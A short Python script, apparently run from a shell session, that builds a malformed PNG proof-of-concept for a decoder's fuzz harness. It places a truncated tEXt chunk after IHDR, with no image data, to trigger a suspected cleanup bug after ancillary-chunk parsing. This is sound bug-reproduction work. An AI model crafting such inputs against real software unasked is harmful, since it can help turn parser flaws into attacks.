import struct, zlib, pathlib

def chunk(t, d):
    return struct.pack('>I', len(d)) + t + d + struct.pack('>I', zlib.crc32(t+d)&0xffffffff)

# Try exact fuzzer format with fmt=1 (RGBA8), stream=1.
flags=0
fmt_stream=0x80 | 1
sig=b'\x89PNG\r\n\x1a\n'
ihdr=chunk(b'IHDR', struct.pack('>IIBBBBB',1,1,8,6,0,0,0))
# malformed ancillary after IHDR, before IDAT, to trigger cleanup after get_ancillary
text=chunk(b'tEXt', b'\x00')
# no IDAT/IEND
poc=bytes([flags, fmt_stream]) + sig + ihdr + text
pathlib.Path('stream_badtext.bin').write_bytes(poc)
print(len(poc))
PY
